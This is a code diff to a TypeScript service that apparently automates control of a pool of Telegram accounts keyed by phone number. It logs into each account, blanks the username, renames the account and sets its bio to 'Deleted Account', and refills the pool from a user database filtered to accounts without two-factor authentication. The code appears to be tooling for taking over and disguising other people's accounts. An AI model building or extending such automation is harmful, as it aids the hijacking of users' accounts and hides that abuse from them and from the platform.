@@ -228,15 +228,20 @@ export class BufferClientService {
         const clients = await this.clientService.findAll();
         const clientIds = clients.map(client => client.mobile);
 
-        bufferclients.map(async (document) => {
+        for (const document of bufferclients) {
             if (!clientIds.includes(document.mobile)) {
                 try {
                     const cli = await this.telegramService.createClient(document.mobile, true, false);
-                    //Comment below line after 1-2 days
-                    await this.telegramService.updateUsername(document.mobile, '');
-                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account');
+                    const me = await cli.getMe();
+                    if (me.username) {
+                        await this.telegramService.updateUsername(document.mobile, '');
+                    }
+                    if (me.firstName !== "Deleted Account") {
+                        await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account');
+                    }
                     const hasPassword = await cli.hasPassword();
                     if (!hasPassword) {
+                        console.log("Client does not have password");
                         badIds.push(document.mobile);
                         await this.remove(document.mobile);
                     } else {
@@ -248,7 +253,7 @@ export class BufferClientService {
                     await this.telegramService.deleteClient(document.mobile)
                     await sleep(2000);
                 } catch (error) {
-                    console.log(document.mobile, " :  false");
+                    parseError(error);
                     badIds.push(document.mobile);
                     this.remove(document.mobile)
                     await this.telegramService.deleteClient(document.mobile)
@@ -256,14 +261,14 @@ export class BufferClientService {
             } else {
                 console.log("Number is a Active Client")
             }
-        })
+        }
         console.log("GoodIds: ", goodIds.length, "BadIds : ", badIds.length);
         this.addNewUserstoBufferClients(badIds, goodIds);
     }
 
     async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {
         const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, twoFA: false }, { lastActive: 1 }, badIds.length + 3);
-        console.log("documents : ", documents.length)
+        console.log("New buffer documents to be added: ", documents.length)
         while (badIds.length > 0 && documents.length > 0) {
             const document = documents.shift();
             try {
@@ -304,10 +309,11 @@ export class BufferClientService {
                         await this.telegramService.deleteClient(document.mobile)
                     }
                 } catch (error) {
-                    console.log(error);
+                    parseError(error)
                     await this.telegramService.deleteClient(document.mobile)
                 }
             } catch (error) {
+                parseError(error)
                 console.error("An error occurred:", error);
             }
         }
